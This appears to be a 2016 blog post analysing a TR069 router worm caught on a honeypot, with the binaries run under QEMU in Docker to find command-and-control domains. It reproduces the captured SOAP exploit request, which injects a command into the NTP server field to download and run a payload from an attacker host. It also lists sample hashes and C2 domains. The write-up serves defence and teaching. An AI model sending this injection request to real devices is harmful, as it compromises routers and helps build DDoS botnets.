---
inFeed: true
description: '29 NOVEMBER 2016 on malware, botnet, honeypots, mass scanning, technical'
dateModified: '2016-12-30T18:17:24.052Z'
datePublished: '2016-12-30T18:17:24.385Z'
title: Quick TR069 Botnet Writeup + Triage
author: []
publisher: {}
via: {}
hasPage: true
sourcePath: _posts/2016-12-30-quick-tr069-botnet-writeup-triage.md
starred: false
datePublishedOriginal: '2016-12-30T18:12:34.784Z'
url: quick-tr069-botnet-writeup-triage/index.html
_type: Article

---
# Quick TR069 Botnet Writeup + Triage

29 NOVEMBER 2016 on [malware][0], [botnet][1], [honeypots][2], [mass scanning][3], [technical][4]

A wormable exploit for the recently published TR069 is being actively exploited. I pulled down some samples and hacked together a goofy way to perform dynamic analysis with Docker, Qemu, and Tcpdump. The C2 domains are tr069\[.\]support and tr069\[.\]online.

---

There are several different botnets propogating this worm. I'm only going to document one of them in this post. Also I haven't written a blog post in like a year so here goes nothing.

# Background

A few articles have crossed my news feeds about the recent TR069 vulnerability. Including the following-

* [http://arstechnica.com/security/2016/11/notorious-iot-botnets-weaponize-new-flaw-found-in-millions-of-home-routers/][5]
* [https://blog.fox-it.com/2016/11/28/recent-vulnerability-in-eir-d1000-router-used-to-spread-updated-version-of-mirai-ddos-bot/][6]
* [https://isc.sans.edu/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759][7]

I figured I'd whip up a web server on a machine I had laying around (something like a raspberry pi) and forward TCP port 7547 through my router, as well as a sniffer for any funky stuff.

# Analysis

Within about five minutes I was getting hits. The malicious requests have already been documented by some of the aforementioned posts, but the requests look something like this:

POST /UD/act?1 HTTP/1.1 Host: 127.0.0.1:7547 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) SOAPAction: urn:dslforum-org:service:Time:1\#SetNTPServers Content-Type: text/xml Content-Length: 519 **<?xml version="1.0"?\>** <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"\> <SOAP-ENV:Body\> <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1"\> <NewNTPServer1\>\`cd /tmp;wget http://srrys.pw/1;chmod 777 1;./1\`</NewNTPServer1\> <NewNTPServer2\></NewNTPServer2\> <NewNTPServer3\></NewNTPServer3\> <NewNTPServer4\></NewNTPServer4\> <NewNTPServer5\></NewNTPServer5\> </u:SetNTPServers\> </SOAP-ENV:Body\> </SOAP-ENV:Envelope\>

Notice the not-so-subtle command injection in this line-

<NewNTPServer1\>\`cd /tmp;wget http:_//srrys.pw/1;chmod 777 1;./1_\`</NewNTPServer1\>

So I routed curl through Tor and downloaded the sample. Also, having reversed a decent amount of shitty IOT worms in my day I went on a hunch and requested hxxp://srrys\[.\]pw/2 through hxxp://srrys\[.\]pw/10 as well and got more hits.

$ file \* 1: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped 2: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped 3: ELF 32-bit LSB executable, ARM, version 1, statically linked, stripped 4: ELF 32-bit LSB executable, Renesas SH, version 1 (SYSV), statically linked, stripped 5: ELF 32-bit MSB executable, PowerPC **or** cisco 4500, version 1 (SYSV), statically linked, stripped 6: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, stripped 7: ELF 32-bit MSB executable, Motorola m68k, 68020, version 1 (SYSV), statically linked, stripped

...with the following SHA256 hashes...

971156ec3dca4fa5c53723863966ed165d546a184f3c8ded008b029fd59d6a5a 1 9f9c38740568cbe1fbb8171b1ad4221c43790ff106623555868abf76f9672e53 2 1fce697993690d41f75e0e6ed522df49d73a038f7e02733ec239c835579c40bf 3 828984d1112f52f7f24bbc2b15d0f4cf2646cd03809e648f0d3121a1bdb83464 4 c597d3b8f61a5b49049006aff5abfe30af06d8979aaaf65454ad2691ef03943b 5 046659391b36a022a48e37bd80ce2c3bd120e3fe786c204128ba32aa8d03a182 6 5d4e46b3510679dc49ce295b7f448cd69e952d80ba1450f6800be074992b07cc 7

If you've ever tracked IOT threats before this will be a familiar sight. Lots of malware cross compiles for lots of different architectures, like in [this example][8].

Lets do some basic static analysis. _This is usually where I'd bust out my IDA Pro but some fucker stole my laptop recently and I haven't gotten my new license yet._ So instead we're going to use Radare2, something equally cool but less familiar to me. Shouts out to the R2 team. Keep doing God's work.

$ r2 1 Warning: Cannot initialize dynamic strings -- Change the graph block definition with graph.callblocks, graph.jmpblocks, graph.flagblocks \[0x00400260\]\> aa \[x\] Analyze all flags starting with sym. **and** entry0 (aa)

I run the aa command to analyze the code/functions, followed by pdf @mainto disassemble main in the regular mode and V @main + space bar to disassemble in visual mode.

_ah yes_

_of course_

_indeed_

oh wait. I don't know MIPS assembly lmfao. But I do know enough assembly to know the file is obfuscated, since the strings are broken and it has reasonably high Shannon entropy.

I sure as shit don't know Motorola m68k or SPARC because I'm a useless millennial.

My ARM is slightly better, so I could reverse that sample. But all I really want to do is find the C2 (command and control) domains.

So static analysis is out of the question. Let's try dynamic analysis.

# MIPS dynamic malware analysis on a budget

The term "dynamic malware analysis" just refers to observing a piece of malwares behavior as it's executing. I'm not a computer engineering major in 2003 so I don't have any MIPS hardware laying around at my house. Instead I'll just emulate a MIPS device with Qemu. Qemu is an emulator, capable of emulating different kinds of hardware. Getting it to work is a pain in the ass sometimes. Fortunately [someone Dockerized it][9].

Docker is a container technology that makes it stupid easy to run software without worrying about things like configuration. It's awesome.

So I grabbed the sample and pulled down the docker container with the following command:

$ docker run -it asmimproved/qemu-mips root@0a5f2731be8e:/project_\#_

From that shell I pulled down tcpdump into the Docker container and started logging pcap to a file.

root@0a5f2731be8e:/project_\# tcpdump -w capture.pcap -n -U_

From another Bash prompt I dropped into the terminal, chmod +x'd the sample, and executed it with the following commands:

$ docker exec -ti peaceful\_spence bash root@0a5f2731be8e:/project_\# chmod +x 1_ root@0a5f2731be8e:/project_\# qemu-mipsel ./1_

You also have to worry about opsec and safe analysis and segmentation and all that, but I'll leave that stuff for a smarter reverser to explain. Anyways, the sample detonated, deobfuscated itself in memory, resolved DNS for the C2s, and started scanning the Internet for more devices to compromise. I let it run for a minute or so, pulled down the pcap, and cracked it open. I found scans to random IPs on TCP ports 7547 and 5555\.

My pcap data showed me the two callback domains for command and control are tr069\[.\]online and tr069.support. Very sneaky.

Whois data shows me both domains were registered earlier today.

$ whois tr069.support Domain Name: tr069.support Domain ID: fec618e5a8fd4ac7bbc5597a04696b08-DONUTS WHOIS Server: www.gandi.net/whois Referral URL: https:_//www.gandi.net_ Updated Date: 2016-11-29T10:40:22Z Creation Date: 2016-11-29T10:40:22Z ...

# Conclusion

There's nothing sophisticated about this malware. It probably doesn't affect your network. But the amount of vulnerable devices on the Internet is something you should give a shit about. This is how botnets happen, and botnets are how big DDoS attacks happen.

I don't have a Yara signature for this malware because nobody uses Yara on embedded devices.

My recommendations?

* Don't give your money to vendors that have a long history of consistently not giving a shit about securing their products
* Check if port 7547 is open on your router. If so, probably just buy a new router
* If you want to be really paranoid and you run a big website or company, use Shodan to find all the vulnerable devices and go ahead and block them so you don't have to worry about getting caught in the DDoS fallout when it inevitably happens.

Hit me up on [Twitter][10] or shoot me an email if you have any questions. Thanks for reading my post!

--Andrew

[0]: http://morris.sc/tag/malware/
[1]: http://morris.sc/tag/botnet/
[2]: http://morris.sc/tag/honeypots/
[3]: http://morris.sc/tag/mass-scanning/
[4]: http://morris.sc/tag/technical/
[5]: http://arstechnica.com/security/2016/11/notorious-iot-botnets-weaponize-new-flaw-found-in-millions-of-home-routers/
[6]: https://blog.fox-it.com/2016/11/28/recent-vulnerability-in-eir-d1000-router-used-to-spread-updated-version-of-mirai-ddos-bot/
[7]: https://isc.sans.edu/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759
[8]: https://github.com/eurialo/lightaidra
[9]: https://hub.docker.com/r/asmimproved/qemu-mips/
[10]: https://twitter.com/andrew___morris